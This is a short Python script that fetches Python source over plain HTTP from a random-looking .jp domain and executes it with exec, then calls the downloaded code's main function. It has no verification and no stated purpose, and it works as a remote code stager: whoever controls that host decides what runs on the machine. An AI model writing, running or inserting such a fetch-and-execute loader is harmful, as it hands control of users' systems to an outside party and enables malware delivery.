import sys
import types
import requests

def get_code():
    url = "http://estgaergaergar.jp/func.py"
    response = requests.get(url)
    return response.text

def execute(source):
    module_name = "runner"
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

def main():
    source = get_code()
    execute(source)

main()
